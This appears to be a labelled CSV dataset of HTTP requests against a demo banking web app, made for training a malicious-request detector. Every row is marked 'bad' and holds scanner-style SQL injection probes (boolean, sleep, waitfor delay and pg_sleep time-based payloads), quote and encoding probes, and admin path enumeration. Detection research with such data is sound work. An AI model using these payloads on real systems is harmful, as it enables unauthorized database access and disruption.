method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=-1%20OR%202%2b88-88-1=0%2b0%2b0%2b1%20--%20&email_addr=sample%40email.tst&name=dedooinx&subject=1',0,0,1,0,4,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=1%00%c0%a7%c0%a2%252527%252522&name=bvxspifs&subject=1',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=%40%40zc5QC&name=bvxspifs&subject=1',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=-1%20OR%202%2b197-197-1=0%2b0%2b0%2b1&email_addr=sample%40email.tst&name=dedooinx&subject=1',0,0,0,0,2,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=JyI=&name=bvxspifs&subject=1',0,0,0,0,0,0,bad
POST,b'/sendFeedback',"b""submit=Submit&cfile=comments.txt&comments=-1'%20OR%202%2b309-309-1=0%2b0%2b0%2b1%20--%20&email_addr=sample%40email.tst&name=dedooinx&subject=1""",1,0,1,0,4,0,bad
POST,b'/sendFeedback',"b""submit=Submit&cfile=comments.txt&comments=-1'%20OR%202%2b534-534-1=0%2b0%2b0%2b1%20or%20'1j0qCDDD'='&email_addr=sample%40email.tst&name=dedooinx&subject=1""",4,0,0,0,4,0,bad
POST,b'/sendFeedback',"b'submit=Submit&cfile=comments.txt&comments=1&email_addr=%bf\'%bf""&name=bvxspifs&subject=1'",1,1,0,0,0,0,bad
POST,b'/sendFeedback',"b'submit=Submit&cfile=comments.txt&comments=1&email_addr=%f0\'\'%f0""""&name=bvxspifs&subject=1'",2,2,0,0,0,0,bad
POST,b'/sendFeedback',"b'submit=Submit&cfile=comments.txt&comments=-1""%20OR%202%2b848-848-1=0%2b0%2b0%2b1%20--%20&email_addr=sample%40email.tst&name=dedooinx&subject=1'",0,1,1,0,4,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=if(now()=sysdate()%2csleep(6)%2c0)&email_addr=sample%40email.tst&name=dedooinx&subject=1',0,0,0,4,0,1,bad
POST,b'/sendFeedback',"b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=1\'""&subject=1'",1,1,0,0,0,0,bad
POST,b'/sendFeedback',"b""submit=Submit&cfile=comments.txt&comments=0'XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR'Z&email_addr=sample%40email.tst&name=dedooinx&subject=1""",2,0,0,5,0,1,bad
POST,b'/sendFeedback',"b'submit=Submit&cfile=comments.txt&comments=0""XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR""Z&email_addr=sample%40email.tst&name=dedooinx&subject=1'",0,2,0,5,0,1,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%5c&subject=1',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=1%00%c0%a7%c0%a2%252527%252522&subject=1',0,0,0,0,0,0,bad
POST,b'/sendFeedback',"b'submit=Submit&cfile=comments.txt&comments=(select(0)from(select(sleep(6)))v)/*\'%2b(select(0)from(select(sleep(6)))v)%2b\'""%2b(select(0)from(select(sleep(6)))v)%2b""*/&email_addr=sample%40email.tst&name=dedooinx&subject=1'",2,2,0,15,0,9,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%40%40VaHmC&subject=1',0,0,0,0,0,0,bad
POST,b'/sendFeedback',"b""submit=Submit&cfile=comments.txt&comments=-1;%20waitfor%20delay%20'0:0:6'%20--%20&email_addr=sample%40email.tst&name=dedooinx&subject=1""",2,0,1,0,5,2,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=JyI=&subject=1',0,0,0,0,0,0,bad
POST,b'/sendFeedback',"b""submit=Submit&cfile=comments.txt&comments=-1);%20waitfor%20delay%20'0:0:9'%20--%20&email_addr=sample%40email.tst&name=dedooinx&subject=1""",2,0,1,0,5,2,bad
POST,b'/sendFeedback',"b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%bf\'%bf""&subject=1'",1,1,0,0,0,0,bad
POST,b'/sendFeedback',"b""submit=Submit&cfile=comments.txt&comments=1%20waitfor%20delay%20'0:0:9'%20--%20&email_addr=sample%40email.tst&name=dedooinx&subject=1""",2,0,1,0,5,2,bad
POST,b'/sendFeedback',"b""submit=Submit&cfile=comments.txt&comments=VckmRnqL';%20waitfor%20delay%20'0:0:3'%20--%20&email_addr=sample%40email.tst&name=dedooinx&subject=1""",3,0,1,0,5,2,bad
POST,b'/sendFeedback',"b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%f0\'\'%f0""""&subject=1'",2,2,0,0,0,0,bad
POST,b'/sendFeedback',"b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=bvxspifs&subject=1\'""'",1,1,0,0,0,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=bvxspifs&subject=%5c',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=bvxspifs&subject=1%00%c0%a7%c0%a2%252527%252522',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst&name=dedooinx&subject=1',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=bvxspifs&subject=%40%40pprjO',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=bvxspifs&subject=JyI=',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=mENbGkPX&name=dedooinx&subject=1',0,0,0,0,0,0,bad
POST,b'/sendFeedback',"b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=bvxspifs&subject=%bf\'%bf""'",1,1,0,0,0,0,bad
POST,b'/sendFeedback',"b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=bvxspifs&subject=%f0\'\'%f0""""'",2,2,0,0,0,0,bad
POST,b'/sendFeedback',"b""submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst%25'%20AND%202*3*8=6*8%20AND%20'Cv1S'!='Cv1S%25&name=dedooinx&subject=1""",4,0,0,0,4,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%202%2b768-768-1=0%2b0%2b0%2b1%20--%20&name=dedooinx&subject=1',0,0,1,0,4,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%203%2b768-768-1=0%2b0%2b0%2b1%20--%20&name=dedooinx&subject=1',0,0,1,0,4,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=dedooinx&subject=CuffVvpU',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=dedooinx&subject=1*1*1*1',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=dedooinx&subject=-1%20OR%202%2b162-162-1=0%2b0%2b0%2b1%20--%20',0,0,1,0,4,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=dedooinx&subject=-1%20OR%203%2b162-162-1=0%2b0%2b0%2b1%20--%20',0,0,1,0,4,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=dedooinx&subject=-1%20OR%202%2b201-201-1=0%2b0%2b0%2b1',0,0,0,0,2,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=dedooinx&subject=-1%20OR%203%2b201-201-1=0%2b0%2b0%2b1',0,0,0,0,2,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=dedooinx&subject=if(now()=sysdate()%2csleep(3)%2c0)',0,0,0,4,0,1,bad
POST,b'/sendFeedback',"b""submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=dedooinx&subject=0'XOR(if(now()=sysdate()%2csleep(6)%2c0))XOR'Z""",2,0,0,5,0,1,bad
POST,b'/sendFeedback',"b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=dedooinx&subject=0""XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR""Z'",0,2,0,5,0,1,bad
POST,b'/sendFeedback',"b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=dedooinx&subject=(select(0)from(select(sleep(3)))v)/*\'%2b(select(0)from(select(sleep(3)))v)%2b\'""%2b(select(0)from(select(sleep(3)))v)%2b""*/'",2,2,0,15,0,9,bad
POST,b'/sendFeedback',"b""submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=dedooinx&subject=-1;%20waitfor%20delay%20'0:0:3'%20--%20""",2,0,1,0,5,2,bad
POST,b'/sendFeedback',"b""submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=dedooinx&subject=-1);%20waitfor%20delay%20'0:0:6'%20--%20""",2,0,1,0,5,2,bad
POST,b'/sendFeedback',"b""submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=dedooinx&subject=1%20waitfor%20delay%20'0:0:9'%20--%20""",2,0,1,0,5,2,bad
POST,b'/sendFeedback',"b""submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=dedooinx&subject=1Wxz65LR';%20waitfor%20delay%20'0:0:9'%20--%20""",3,0,1,0,5,2,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=1acuuHcCBvsuHU&comments=1&email_addr=sample%40email.tst&name=flqcdnfa&subject=1',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=1acuyywbVTeuth&name=flqcdnfa&subject=1',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=1acuJSwyuI6kAe&subject=1',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1acuxAxtv9NAJU&email_addr=sample%40email.tst&name=flqcdnfa&subject=1',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=flqcdnfa&subject=1acuo9He86pHcd',0,0,0,0,0,0,bad
GET,b'/status_check.jsp',b'',0,0,0,0,0,0,bad
GET,b'/subscribe.jsp',b'',0,0,0,0,0,0,bad
GET,b'/survey_questions.jsp',b'',0,0,0,0,0,0,bad
GET,b'/swagger/index.html',b'',0,0,0,0,0,0,bad
GET,b'/swagger/properties.json',b'',0,0,0,0,0,0,bad
GET,b'/swagger/swagger-ui-bundle.js',b'',0,0,0,0,0,0,bad
GET,b'/swagger/swagger-ui-standalone-preset.js',b'',0,0,0,0,0,0,bad
GET,b'/util/serverStatusCheckService.jsp',b'',0,0,0,0,0,0,bad
GET,b'/admin',b'',0,0,0,0,0,0,bad
GET,b'/admin/clients.xls',b'',0,0,0,0,0,0,bad
GET,b'/doLogin',b'',0,0,0,0,0,0,bad
POST,b'/doSubscribe',b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst',0,0,0,0,0,0,bad
POST,b'/doSubscribe',"b'btnSubmit=Subscribe&txtEmail=1\'""'",1,1,0,0,0,0,bad
POST,b'/doSubscribe',b'btnSubmit=Subscribe&txtEmail=%5c',0,0,0,0,0,0,bad
POST,b'/doSubscribe',b'btnSubmit=Subscribe&txtEmail=1%00%c0%a7%c0%a2%252527%252522',0,0,0,0,0,0,bad
POST,b'/doSubscribe',b'btnSubmit=Subscribe&txtEmail=-1%20OR%202%2b419-419-1=0%2b0%2b0%2b1%20--%20',0,0,1,0,4,0,bad
POST,b'/doSubscribe',b'btnSubmit=Subscribe&txtEmail=-1%20OR%202%2b927-927-1=0%2b0%2b0%2b1',0,0,0,0,2,0,bad
POST,b'/doSubscribe',b'btnSubmit=Subscribe&txtEmail=%40%407bbVp',0,0,0,0,0,0,bad
POST,b'/doSubscribe',"b""btnSubmit=Subscribe&txtEmail=-1'%20OR%202%2b823-823-1=0%2b0%2b0%2b1%20--%20""",1,0,1,0,4,0,bad
POST,b'/doSubscribe',b'btnSubmit=Subscribe&txtEmail=JyI=',0,0,0,0,0,0,bad
POST,b'/doSubscribe',"b""btnSubmit=Subscribe&txtEmail=-1'%20OR%202%2b97-97-1=0%2b0%2b0%2b1%20or%20'Ea1FuPyP'='""",4,0,0,0,4,0,bad
POST,b'/doSubscribe',"b'btnSubmit=Subscribe&txtEmail=%bf\'%bf""'",1,1,0,0,0,0,bad
POST,b'/doSubscribe',"b'btnSubmit=Subscribe&txtEmail=-1""%20OR%202%2b16-16-1=0%2b0%2b0%2b1%20--%20'",0,1,1,0,4,0,bad
POST,b'/doSubscribe',"b'btnSubmit=Subscribe&txtEmail=%f0\'\'%f0""""'",2,2,0,0,0,0,bad
POST,b'/doSubscribe',b'btnSubmit=Subscribe&txtEmail=if(now()=sysdate()%2csleep(9)%2c0)',0,0,0,4,0,1,bad
POST,b'/doSubscribe',"b""btnSubmit=Subscribe&txtEmail=0'XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR'Z""",2,0,0,5,0,1,bad
POST,b'/doSubscribe',"b'btnSubmit=Subscribe&txtEmail=0""XOR(if(now()=sysdate()%2csleep(6)%2c0))XOR""Z'",0,2,0,5,0,1,bad
POST,b'/doSubscribe',"b'btnSubmit=Subscribe&txtEmail=(select(0)from(select(sleep(6)))v)/*\'%2b(select(0)from(select(sleep(6)))v)%2b\'""%2b(select(0)from(select(sleep(6)))v)%2b""*/'",2,2,0,15,0,9,bad
POST,b'/doSubscribe',"b""btnSubmit=Subscribe&txtEmail=1%20waitfor%20delay%20'0:0:9'%20--%20""",2,0,1,0,5,2,bad
POST,b'/doSubscribe',"b""btnSubmit=Subscribe&txtEmail=97rwy5bR';%20waitfor%20delay%20'0:0:9'%20--%20""",3,0,1,0,5,2,bad
POST,b'/doSubscribe',"b""btnSubmit=Subscribe&txtEmail=QvORLL22'));select%20pg_sleep(6);%20--%20""",1,0,1,1,3,2,bad
POST,b'/doSubscribe',b'btnSubmit=Subscribe&txtEmail=1acuJJPrsHsN9m',0,0,0,0,0,0,bad
GET,b'/images',b'',0,0,0,0,0,0,bad
GET,b'/swagger',b'',0,0,0,0,0,0,bad
GET,b'/util',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=%40%40LO9i9',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=%5c',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=-1%20OR%202%2b101-101-1=0%2b0%2b0%2b1',b'',0,0,0,0,2,0,bad
GET,b'/index.jsp?content=-1%20OR%202%2b814-814-1=0%2b0%2b0%2b1%20--%20',b'',0,0,1,0,4,0,bad
GET,b'/index.jsp?content=-1%20OR%203%2b101-101-1=0%2b0%2b0%2b1',b'',0,0,0,0,2,0,bad
GET,b'/index.jsp?content=-1%20OR%203%2b814-814-1=0%2b0%2b0%2b1%20--%20',b'',0,0,1,0,4,0,bad
GET,"b""/index.jsp?content=0'XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR'Z""",b'',2,0,0,5,0,1,bad
GET,b'/index.jsp?content=1%00%c0%a7%c0%a2%252527%252522',b'',0,0,0,0,0,0,bad
GET,"b""/index.jsp?content=1%20waitfor%20delay%20'0:0:3'%20--%20""",b'',2,0,1,0,5,2,bad
GET,b'/index.jsp?content=1acuQko7h4zCOb',b'',0,0,0,0,0,0,bad
GET,"b""/index.jsp?content=BzPl85AB';%20waitfor%20delay%20'0:0:6'%20--%20""",b'',3,0,1,0,5,2,bad
GET,b'/index.jsp?content=JyI=',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=YLSub9gu',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=business.htm',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=business_cards.htm',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=business_deposit.htm',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=business_insurance.htm',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=business_lending.htm',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=business_retirement.htm',b'',0,0,0,0,0,0,bad
GET,"b""/index.jsp?content=dFoiQJbB'));select%20pg_sleep(9);%20--%20""",b'',1,0,1,1,3,2,bad
GET,b'/index.jsp?content=if(now()=sysdate()%2csleep(9)%2c0)',b'',0,0,0,4,0,1,bad
GET,b'/index.jsp?content=inside_investor.htm',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=inside_press.htm',b'',0,0,0,0,0,0,bad
GET,"b""/index.jsp?content=inside_press.htm%25'%20AND%202*3*8=6*8%20AND%20'mJn0'!='mJn0%25""",b'',4,0,0,0,4,0,bad
GET,b'/index.jsp?content=personal_investments.htm',b'',0,0,0,0,0,0,bad
GET,b'/index.jsp?content=personal_other.htm',b'',0,0,0,0,0,0,bad
GET,"b""/index.jsp?content=yGefCFyE');select%20pg_sleep(9);%20--%20""",b'',1,0,1,1,3,2,bad
GET,b'/search.jsp?query=%40%408Tv4t',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=%5c',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=-1%20OR%202%2b543-543-1=0%2b0%2b0%2b1',b'',0,0,0,0,2,0,bad
GET,b'/search.jsp?query=-1%20OR%202%2b751-751-1=0%2b0%2b0%2b1%20--%20',b'',0,0,1,0,4,0,bad
GET,b'/search.jsp?query=-1%20OR%203%2b543-543-1=0%2b0%2b0%2b1',b'',0,0,0,0,2,0,bad
GET,b'/search.jsp?query=-1%20OR%203%2b751-751-1=0%2b0%2b0%2b1%20--%20',b'',0,0,1,0,4,0,bad
GET,"b""/search.jsp?query=-1);%20waitfor%20delay%20'0:0:9'%20--%20""",b'',2,0,1,0,5,2,bad
GET,"b""/search.jsp?query=-1;%20waitfor%20delay%20'0:0:9'%20--%20""",b'',2,0,1,0,5,2,bad
GET,"b""/search.jsp?query=0'XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR'Z""",b'',2,0,0,5,0,1,bad
GET,b'/search.jsp?query=1',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=1%00%c0%a7%c0%a2%252527%252522',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=1%20waitfor%20delay%20'0:0:3'%20--%20""",b'',2,0,1,0,5,2,bad
GET,b'/search.jsp?query=1*1*1*1',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=1acu3DPGSnsv2R',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=32kC9Q3I';%20waitfor%20delay%20'0:0:3'%20--%20""",b'',3,0,1,0,5,2,bad
GET,b'/search.jsp?query=JyI=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=P1Ao4M0h',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=SZqCLjQf'));select%20pg_sleep(6);%20--%20""",b'',1,0,1,1,3,2,bad
GET,b'/search.jsp?query=if(now()=sysdate()%2csleep(9)%2c0)',b'',0,0,0,4,0,1,bad
GET,"b""/search.jsp?query=lAy6zQTH');select%20pg_sleep(3);%20--%20""",b'',1,0,1,1,3,2,bad
GET,b'/survey_questions.jsp?step=%40%40Ds5q6',b'',0,0,0,0,0,0,bad
GET,b'/survey_questions.jsp?step=%5c',b'',0,0,0,0,0,0,bad
GET,b'/survey_questions.jsp?step=-1%20OR%202%2b207-207-1=0%2b0%2b0%2b1',b'',0,0,0,0,2,0,bad
GET,b'/survey_questions.jsp?step=-1%20OR%202%2b801-801-1=0%2b0%2b0%2b1%20--%20',b'',0,0,1,0,4,0,bad
